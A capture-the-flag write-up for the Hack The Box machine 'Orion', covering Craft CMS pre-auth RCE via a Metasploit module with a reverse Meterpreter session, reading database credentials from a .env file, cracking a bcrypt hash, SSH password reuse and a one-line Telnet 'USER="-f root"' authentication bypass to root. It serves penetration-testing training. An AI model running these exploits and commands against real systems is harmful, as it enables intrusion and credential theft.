# Hack The Box — Orion

> **Platform:** Hack The Box  
> **Target:** Orion  
> **OS:** Linux  
> **Difficulty:** Easy  
> **Focus:** Web enumeration, Craft CMS, pre-auth RCE, credential discovery, MariaDB, bcrypt cracking, SSH credential reuse, local service enumeration, Telnet privilege escalation

---

## Table of Contents

- [1. Overview](#1-overview)
- [2. Initial Enumeration](#2-initial-enumeration)
- [3. Web Enumeration](#3-web-enumeration)
- [4. Directory Enumeration](#4-directory-enumeration)
- [5. Identifying Craft CMS](#5-identifying-craft-cms)
- [6. Craft CMS Pre-Auth RCE](#6-craft-cms-pre-auth-rce)
- [7. Obtaining a Shell](#7-obtaining-a-shell)
- [8. Credential Discovery](#8-credential-discovery)
- [9. Accessing MariaDB](#9-accessing-mariadb)
- [10. Extracting the Password Hash](#10-extracting-the-password-hash)
- [11. Cracking the bcrypt Hash](#11-cracking-the-bcrypt-hash)
- [12. SSH Access as Adam](#12-ssh-access-as-adam)
- [13. Local Enumeration](#13-local-enumeration)
- [14. Discovering the Local Telnet Service](#14-discovering-the-local-telnet-service)
- [15. Telnet Authentication Bypass](#15-telnet-authentication-bypass)
- [16. Root Access](#16-root-access)
- [17. Attack Chain](#17-attack-chain)
- [18. Key Takeaways](#18-key-takeaways)
- [19. Command Reference](#19-command-reference)

---

# 1. Overview

Orion is a Linux machine that can be compromised by chaining several vulnerabilities and misconfigurations together.

The attack path was:

```text
Port Enumeration
        ↓
Web Service Discovery
        ↓
orion.htb Virtual Host
        ↓
Craft CMS 5.6.16
        ↓
CVE-2025-32432
        ↓
Pre-Authentication RCE
        ↓
www-data Shell
        ↓
Craft CMS .env File
        ↓
MariaDB Credentials
        ↓
Craft CMS Database
        ↓
Admin bcrypt Hash
        ↓
Hash Cracking
        ↓
Password Reuse
        ↓
SSH as adam
        ↓
Local Enumeration
        ↓
Telnet on 127.0.0.1:23
        ↓
CVE-2026-24061
        ↓
Authentication Bypass
        ↓
root
```

The most important lesson from Orion is that the initial foothold and the final privilege escalation are completely different vulnerabilities. The initial access comes from an outdated web application, while the final escalation relies on a vulnerable local Telnet installation.

---

# 2. Initial Enumeration

As always, I started by enumerating the target's exposed TCP ports.

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.90.39 -oG ports
```

The scan revealed two interesting ports:

```text
22/tcp   open   ssh
80/tcp   open   http
```

The presence of HTTP immediately made the web application the primary attack surface.

I then performed a more detailed service/version scan:

```bash
nmap -sCV -p22,80 10.129.90.39
```

The web server redirected to a hostname rather than serving the application directly through the IP address.

This suggested that virtual-host based routing was being used.

---

# 3. Web Enumeration

I added the hostname to `/etc/hosts`:

```bash
sudo sh -c 'echo "10.129.90.39 orion.htb" >> /etc/hosts'
```

This allowed the application to be accessed using:

```text
http://orion.htb
```

instead of directly accessing the IP address.

The homepage presented an Orion Telecom website.

At this point, I started fingerprinting the technologies used by the application.

One of the first things worth checking when dealing with a web application is the underlying framework or CMS because identifying a specific product and version can immediately reveal known vulnerabilities.

I used:

```bash
whatweb http://orion.htb
```

The results indicated that the application was using:

- Craft CMS
- PHP
- Yii Framework

The page footer also provided information about Craft CMS.

---

# 4. Directory Enumeration

After identifying the web technology, I performed directory enumeration to discover hidden endpoints.

For example:

```bash
gobuster dir -u http://orion.htb/ -w /usr/share/wordlists/dirb/common.txt
```

The interesting results included:

```text
/admin        → 302 → /admin/login
/assets       → 301
/index        → 200
/index.php    → 200
/wp-admin     → 418
```

The `/admin` endpoint was particularly interesting because it redirected to:

```text
http://orion.htb/admin/login
```

Accessing the endpoint revealed the Craft CMS administration login page.

More importantly, the login page disclosed the exact Craft CMS version:

```text
Craft CMS 5.6.16
```

At this point, the attack surface became much more interesting.

---

# 5. Identifying Craft CMS

The application was running:

```text
Craft CMS 5.6.16
```

Knowing the exact version is extremely valuable because it allows us to search for vulnerabilities affecting that specific release.

I searched for known vulnerabilities using SearchSploit and online vulnerability databases.

The important vulnerability was:

```text
CVE-2025-32432
```

This vulnerability affects Craft CMS and allows **pre-authentication Remote Code Execution**.

The important part of this vulnerability is that authentication is not required before exploiting the vulnerable functionality.

This meant that the `/admin/login` page did not necessarily need valid credentials to obtain code execution.

---

# 6. Craft CMS Pre-Auth RCE

I first investigated the available exploit implementations.

SearchSploit showed an exploit related to the vulnerable Craft CMS version.

However, the available Python implementation did not work directly against the target because of differences in how the target handled the session/application configuration.

Instead of continuing to modify the exploit manually, I decided to use Metasploit.

I searched for the relevant CVE:

```text
search CVE-2025-32432
```

Metasploit provided the corresponding exploit module:

```text
exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
```

I selected the module and configured the target:

```text
use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432

set RHOSTS 10.129.90.39
set RPORT 80
set LHOST 10.10.14.196
set LPORT 4444
```

The initial automatic exploit check failed:

```text
Exploit aborted due to failure:
unknown: Cannot reliably check exploitability
```

This does **not necessarily mean that the vulnerability is not present**.

An exploit's automatic check can fail even when the target is vulnerable. In this case, I disabled the automatic check:

```text
set AutoCheck false
```

and executed the module again.

The exploit successfully injected the payload and created a Meterpreter session.

---

# 7. Obtaining a Shell

The Meterpreter session was running as:

```text
www-data
```

I opened a system shell:

```text
shell
```

Because the resulting shell was not a proper interactive TTY, I stabilized it using:

```bash
script /dev/null -c bash
```

This is useful because a raw reverse shell often lacks features such as:

- Proper line editing
- Job control
- Signal handling
- Interactive programs

After stabilizing the shell, I confirmed the current user:

```bash
id
```

The result showed:

```text
uid=33(www-data) gid=33(www-data)
```

At this point, I had achieved initial code execution, but I was still a low-privileged web user.

The next objective was therefore credential discovery.

---

# 8. Credential Discovery

Since the application was running Craft CMS, I inspected its installation directory:

```bash
cd /var/www/html/craft
ls -la
```

One of the most interesting files was:

```text
.env
```

Environment files are particularly valuable during web application compromises because they frequently contain credentials and configuration information that should never be exposed to an attacker.

I read the file:

```bash
cat .env
```

Among the configuration values were the Craft database settings:

```text
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
```

This gave me valid credentials for the local MariaDB instance.

The important lesson here is that obtaining RCE is not always the final goal. Configuration files belonging to the compromised application can often provide credentials for other services.

---

# 9. Accessing MariaDB

The database was listening locally on port `3306`.

I opened a shell and connected using the credentials found in `.env`:

```bash
mysql -u root -p orion
```

After entering the discovered password, I successfully reached the MariaDB console:

```text
MariaDB [orion]>
```

I then enumerated the database tables:

```sql
SHOW TABLES;
```

There were many Craft CMS tables.

One of the most interesting tables was:

```text
users
```

This is exactly the kind of table worth investigating because Craft CMS stores user account information there.

---

# 10. Extracting the Password Hash

I inspected the structure of the table:

```sql
DESCRIBE users;
```

The table contained fields including:

```text
username
email
password
```

I then queried the relevant information:

```sql
SELECT id, username, email, password FROM users;
```

The database returned a user account associated with:

```text
adam@orion.htb
```

and a bcrypt password hash.

The hash format began with:

```text
$2y$13$
```

This identifies the password as a **bcrypt** hash with a cost factor of 13.

At this stage, I had no plaintext password, only the hash.

---

# 11. Cracking the bcrypt Hash

I copied the hash into a file on my attacking machine:

```bash
nano hash.txt
```

The hash was then attacked using Hashcat.

For bcrypt, Hashcat uses mode:

```text
3200
```

Therefore:

```bash
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

bcrypt is intentionally expensive to crack, so this process was considerably slower than cracking fast hashes such as MD5 or SHA-1.

After successfully cracking the hash, the plaintext password was:

```text
darkangel
```

The important discovery was that the password was reused for the `adam` account.

This is a classic example of why password reuse is dangerous: compromising one application can provide credentials that are valid for an entirely different service.

---

# 12. SSH Access as Adam

Since SSH was exposed on port 22 and I now had valid credentials, I attempted to authenticate as `adam`:

```bash
ssh adam@10.129.90.39
```

Using:

```text
Password: darkangel
```

I successfully obtained an SSH session.

I verified the account:

```bash
whoami
```

which returned:

```text
adam
```

The user flag could then be retrieved from the user's home directory:

```bash
cat ~/user.txt
```

At this point, the initial compromise had been converted into a stable SSH session as a real local user.

However, `adam` was not root, so I continued with local privilege-escalation enumeration.

---

# 13. Local Enumeration

Whenever I obtain a shell on a Linux target, I perform basic local enumeration.

One of the first things I checked was the list of listening services:

```bash
ss -tulnp
```

The output contained an interesting entry:

```text
tcp LISTEN 0 10 127.0.0.1:23
```

Port `23` is the standard Telnet port.

The important detail was:

```text
127.0.0.1:23
```

This means the service was bound only to the loopback interface.

Therefore, it was **not accessible remotely**.

This also explains why the initial Nmap scan did not show port 23.

The service only became visible after gaining access to the machine.

This is an important penetration-testing concept:

```text
External enumeration
        ↓
Only externally exposed services
```

versus:

```text
Local enumeration
        ↓
Externally exposed services
+
localhost-only services
+
internal applications
+
local sockets
```

---

# 14. Discovering the Local Telnet Service

I checked the installed Telnet version:

```bash
telnet --version
```

The target was running:

```text
GNU inetutils telnet 2.7
```

At this point I searched for vulnerabilities affecting that version.

The relevant vulnerability was:

```text
CVE-2026-24061
```

This vulnerability allows an authentication bypass by manipulating the `USER` environment variable.

The vulnerable behaviour is related to how Telnet handles the username passed to the underlying authentication process.

The important point is that the `USER` variable is attacker-controlled.

---

# 15. Telnet Authentication Bypass

The exploit relies on setting the `USER` environment variable to a specially crafted value:

```bash
USER="-f root" telnet -a 127.0.0.1
```

Let's break down what is happening.

### `USER=`

The command begins by setting an environment variable:

```bash
USER="-f root"
```

Instead of containing a normal username such as:

```text
adam
```

the variable contains:

```text
-f root
```

### `telnet -a`

The `-a` option tells Telnet to attempt automatic login using the local username information.

Because the username is controlled through the environment variable, the specially crafted value reaches the authentication mechanism.

### `127.0.0.1`

The Telnet service is only listening locally:

```text
127.0.0.1:23
```

so the command must be executed from the compromised machine.

The vulnerable authentication flow interprets:

```text
-f root
```

in a way that causes the login process to treat the authentication as already validated for the `root` account.

The result is an authentication bypass.

---

# 16. Root Access

After executing:

```bash
USER="-f root" telnet -a 127.0.0.1
```

the Telnet service provided a root shell without requiring the root password.

I verified the privilege level:

```bash
whoami
```

The result was:

```text
root
```

The final flag could then be retrieved:

```bash
cat /root/root.txt
```

This completed the privilege-escalation chain.

---

# 17. Attack Chain

The complete attack path can be summarized as:

```text
┌──────────────────────────────────┐
│ 1. Port Enumeration              │
│    22 SSH / 80 HTTP              │
└───────────────┬──────────────────┘
                │
                ▼
┌──────────────────────────────────┐
│ 2. Web Enumeration               │
│    orion.htb                     │
└───────────────┬──────────────────┘
                │
                ▼
┌──────────────────────────────────┐
│ 3. Identify Craft CMS            │
│    Version 5.6.16                │
└───────────────┬──────────────────┘
                │
                ▼
┌──────────────────────────────────┐
│ 4. CVE-2025-32432                │
│    Pre-authentication RCE        │
└───────────────┬──────────────────┘
                │
                ▼
┌──────────────────────────────────┐
│ 5. Meterpreter / www-data        │
└───────────────┬──────────────────┘
                │
                ▼
┌──────────────────────────────────┐
│ 6. Read Craft .env               │
│    Database credentials          │
└───────────────┬──────────────────┘
                │
                ▼
┌──────────────────────────────────┐
│ 7. Access MariaDB                │
│    Database: orion               │
└───────────────┬──────────────────┘
                │
                ▼
┌──────────────────────────────────┐
│ 8. Extract bcrypt hash           │
│    users table                   │
└───────────────┬──────────────────┘
                │
                ▼
┌──────────────────────────────────┐
│ 9. Crack password                │
│    darkangel                     │
└───────────────┬──────────────────┘
                │
                ▼
┌──────────────────────────────────┐
│ 10. SSH as adam                  │
└───────────────┬──────────────────┘
                │
                ▼
┌──────────────────────────────────┐
│ 11. Local Enumeration            │
│     127.0.0.1:23                 │
└───────────────┬──────────────────┘
                │
                ▼
┌──────────────────────────────────┐
│ 12. GNU inetutils Telnet 2.7     │
│     CVE-2026-24061               │
└───────────────┬──────────────────┘
                │
                ▼
┌──────────────────────────────────┐
│ 13. USER variable manipulation   │
│     USER="-f root"               │
└───────────────┬──────────────────┘
                │
                ▼
┌──────────────────────────────────┐
│ 14. Root shell                   │
└──────────────────────────────────┘
```

---

# 18. Key Takeaways

### 1. Always identify the exact web application version

Finding:

```text
Craft CMS 5.6.16
```

was much more valuable than simply knowing that the target was running PHP.

Exact versions allow us to map the software to known vulnerabilities.

---

### 2. Pre-authentication vulnerabilities are extremely valuable

The Craft CMS vulnerability required no valid credentials.

This allowed the attack to progress from:

```text
Unauthenticated HTTP access
```

to:

```text
Remote Code Execution
```

without first compromising an account.

---

### 3. Configuration files are a high-value target

Once I obtained code execution as `www-data`, the `.env` file immediately became interesting.

It contained:

```text
CRAFT_DB_USER
CRAFT_DB_PASSWORD
CRAFT_DB_DATABASE
```

This demonstrates why sensitive configuration files should never be exposed to application users or attackers.

---

### 4. Database credentials can lead to operating-system credentials

The database credentials did not directly provide an operating-system shell.

Instead, they allowed access to the Craft CMS database, where user password hashes were stored.

The chain was:

```text
.env
 ↓
MariaDB credentials
 ↓
users table
 ↓
bcrypt hash
 ↓
password cracking
 ↓
password reuse
 ↓
SSH
```

This type of credential chaining is extremely common in real-world penetration tests.

---

### 5. Password reuse can completely change the attack path

The password recovered from the Craft CMS user database was also valid for the `adam` SSH account.

Therefore, a credential originally obtained from a web application became a valid operating-system credential.

---

### 6. Local enumeration is essential

The Telnet service was invisible from the attacker machine because it was bound to:

```text
127.0.0.1
```

External Nmap enumeration only showed:

```text
22
80
```

After obtaining local access, however:

```bash
ss -tulnp
```

revealed:

```text
127.0.0.1:23
```

This is why local enumeration should never be skipped after obtaining a foothold.

---

### 7. Localhost-only services can still be critical

A service does not need to be remotely accessible to be exploitable.

If an attacker obtains any shell on the host, services bound to localhost become part of the attack surface.

---

### 8. Exploit checks can fail even when exploitation works

The Metasploit module initially reported that it could not reliably determine whether the target was exploitable.

After disabling the automatic check:

```text
set AutoCheck false
```

the exploit successfully executed.

This is a useful reminder that:

> A failed automated check does not necessarily mean that the vulnerability does not exist.

Manual verification and understanding the underlying vulnerability remain important.

---

# 19. Command Reference

## Port scanning

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.90.39 -oG ports
```

```bash
nmap -sCV -p22,80 10.129.90.39
```

## Hostname resolution

```bash
sudo sh -c 'echo "10.129.90.39 orion.htb" >> /etc/hosts'
```

## Web fingerprinting

```bash
whatweb http://orion.htb
```

## Directory enumeration

```bash
gobuster dir -u http://orion.htb/ -w /usr/share/wordlists/dirb/common.txt
```

## Metasploit

```text
use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
set RHOSTS 10.129.90.39
set RPORT 80
set LHOST 10.10.14.196
set LPORT 4444
set AutoCheck false
run
```

## Shell stabilization

```bash
script /dev/null -c bash
```

## Craft configuration

```bash
cat /var/www/html/craft/.env
```

## MariaDB

```bash
mysql -u root -p orion
```

```sql
SHOW TABLES;
```

```sql
DESCRIBE users;
```

```sql
SELECT id, username, email, password FROM users;
```

## Hashcat

```bash
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

```bash
hashcat -m 3200 hash.txt --show
```

## SSH

```bash
ssh adam@10.129.90.39
```

## Local enumeration

```bash
ss -tulnp
```

## Telnet version

```bash
telnet --version
```

## Telnet authentication bypass

```bash
USER="-f root" telnet -a 127.0.0.1
```

## Verify privileges

```bash
whoami
```

## Root flag

```bash
cat /root/root.txt
```

---

# Final Notes

Orion is a good example of why a penetration test should be approached as a **chain of discoveries rather than a search for a single exploit**.

The initial vulnerability in Craft CMS provided only a foothold as `www-data`. The real progression came from investigating the compromised application, finding database credentials in `.env`, extracting a password hash from MariaDB, identifying password reuse, and then performing local enumeration after obtaining SSH access.

The final privilege escalation was only possible because the local enumeration revealed a service that was completely invisible from the external attacker's perspective.

The complete chain can therefore be summarized as:

```text
Web Application
      ↓
Craft CMS RCE
      ↓
www-data
      ↓
Configuration Disclosure
      ↓
Database Access
      ↓
Credential Recovery
      ↓
SSH as adam
      ↓
Local Service Enumeration
      ↓
Telnet Vulnerability
      ↓
root
```

**The main lesson from Orion is simple: enumerate everything available from your current privilege level.**
